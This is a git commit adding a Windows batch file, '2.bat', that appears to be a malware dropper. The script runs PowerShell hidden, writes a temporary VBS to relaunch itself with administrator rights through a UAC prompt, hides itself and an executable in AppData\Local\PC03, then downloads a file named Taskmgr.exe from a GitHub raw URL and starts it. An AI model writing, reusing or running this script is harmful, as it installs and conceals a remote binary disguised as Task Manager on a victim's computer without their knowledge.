fafd30aca2fce3d14bc82b9eadef031537dd81f1
AnyTXDR <toaas0654555@gmail.com>
2024-06-19 04:00:38 -0400

    Add files via upload

---
+++ 2.bat
@@ -0,0 +1,36 @@
+ÿþ
+s
+
+@echo off
+
+powershell -window hidden -command ""
+
+
+    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
+>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
+) ELSE (
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+)
+
+if '%errorlevel%' NEQ '0' (
+    goto UACPrompt
+) else ( goto gotAdmin )
+
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    set params= %*
+    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs
+
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /B
+
+:gotAdmin
+    pushd "%CD%"
+    CD /D "%~dp0"
+
+cd C:\Users\%USERNAME%\AppData\Local\PC03" 
+attrib +h "C:\Users\%USERNAME%\AppData\Local\PC03\2.bat" /s /d
+attrib +h "C:\Users\%USERNAME%\AppData\Local\PC03\Taskmgr.exe" /s /d
+Powershell -Command "Invoke-Webrequest 'https://github.com/AnyTXDR/taskmgr/raw/main/Taskmgr.exe' -OutFile Taskmgr.exe"
+start Taskmgr.exe
